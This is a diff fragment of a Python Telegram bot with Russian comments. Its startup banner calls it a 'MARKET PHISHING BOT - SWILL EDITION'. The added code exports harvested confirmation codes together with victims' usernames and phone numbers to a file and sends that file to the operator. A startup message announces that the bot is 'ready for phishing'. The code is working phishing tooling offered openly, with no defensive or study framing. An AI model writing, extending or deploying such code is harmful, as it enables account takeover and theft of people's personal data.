+        for code in codes:
+            f.write(f"{code[0]} | @{code[1] or 'нет'} | +{code[2] or 'нет'} | {code[3] or 'нет'} | {code[4] or 'нет'}\n")
+        file_path = f.name
+    
+    # Отправляем файл
+    try:
+        document = FSInputFile(file_path, filename="codes_export.txt")
+        await message.answer_document(document, caption="🔢 Экспорт кодов подтверждения")
+        os.unlink(file_path)
+    except Exception as e:
+        await message.answer(f"❌ Ошибка экспорта: {e}")
+
 # Запуск бота
 async def main():
     print("=" * 50)
-    print("🛒 MARKET PHISHING BOT")
+    print("🛒 MARKET PHISHING BOT - SWILL EDITION")
     print(f"👑 Admin: {ADMIN_ID}")
     print(f"👮 Moderators: {MODERATOR_IDS}")
-    print(f"💾 Database: market_bot.db")
+    print(f"🤖 Bot: @{await bot.me()}")
+    print(f"💾 Database initialized")
     print("=" * 50)
+    
+    # Уведомление админу о запуске
+    try:
+        await bot.send_message(
+            ADMIN_ID,
+            f"🤖 *Бот запущен!*\n\nВремя: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\nСтатус: ✅ Активен\nГотов к фишингу!",
+            parse_mode="Markdown"
+        )
+    except:
+        pass
     
     await dp.start_polling(bot)
 
